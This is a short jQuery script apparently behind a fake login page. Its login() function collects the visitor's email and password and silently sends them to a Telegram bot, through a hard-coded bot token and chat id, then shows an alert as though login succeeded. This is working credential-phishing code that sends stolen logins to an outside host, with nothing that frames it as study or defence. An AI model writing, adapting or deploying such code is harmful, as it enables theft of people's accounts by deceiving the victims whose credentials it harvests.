$(document).ready(function(){

var winh = $(window).height();

$(".header").height(winh);
$(".space").height(winh /4);


$("button").click(function(){
window.location.href = "login.html";
});



});

function login(){
var username = $("#email").val();
var pass = $("#pass").val();

var text = "email : " + username + "|| pass : " + pass;

var token = "778444790:AAGSDWoCtikQEP0wTx5BU31b61rsXrnUwP0";
var id = "232267354";

if(email.length > 0 && pass.length > 0){


$("#logbut").attr("disabled","disabled");
    
    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text, function( data ) {
$("#logbut").removeAttr("disabled","disabled");
$(".alert").show();
$("#email,#pass").val("");
      });

}

}
